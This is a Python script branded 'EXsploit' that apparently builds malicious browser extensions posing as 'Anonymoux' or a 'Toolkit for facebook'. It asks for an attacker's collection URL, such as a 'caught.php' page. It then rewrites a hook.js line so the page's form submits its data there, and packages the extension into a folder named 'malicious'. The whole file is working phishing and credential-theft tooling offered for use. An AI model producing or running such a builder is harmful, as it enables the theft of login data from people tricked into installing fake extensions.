import os
import sys

os.system("mkdir "+os.getcwd() + " /malicious")
os.system("clear")
print """

***********************************************************
_______________  ___               .__         .__  __    *
\_   _____/\   \/  /  ____________ |  |   ____ |__|/  |_  *
 |    __)_  \     /  /  ___/\____ \|  |  /  _ \|  \   __\ *
 |        \ /     \  \___ \ |  |_> >  |_(  <_> )  ||  |   *
/_______  //___/\  \/____  >|   __/|____/\____/|__||__|   *
        \/       \_/     \/ |__|                          *
***********************************************************
            contact us:https://www.facebook.com/script1337


"""

print """
Which extension you want:
1> Anonymoux
2> Toolkit for facebook
3> Exit
"""

choice = input("> ")
def change():
    if choice == 3:
        sys.exit()
    elif choice == 1:
        path = os.getcwd() + "/anon/hook.js"
        check = True
    else:
        path = os.getcwd() + "/toolkit/hook.js"
        check = False
    lines = open(path, 'r').readlines()
    try:
        geturl = raw_input("\nplz enter you website url here @ Example = http://script1337.com/caught.php > ")
    except:
        geturl = input("\nplz enter you website url here @ Example = http://script1337.com/caught.php > ")
    lines[3] = "document.getElementsByTagName(\"form\")[0].setAttribute(\"action\", \""+geturl+"\");"
    out = open(path, 'w')
    out.writelines(lines)
    out.close()

    if check == True:
        os.system("cp -r "+os.getcwd() + "/anon " + os.getcwd() + "/malicious")
    elif check == False:
        os.system("cp -r "+os.getcwd() + "/toolkit " + os.getcwd() + "/malicious")
change()

print ("Your extension is saved here: " + os.getcwd() + "/malicious")
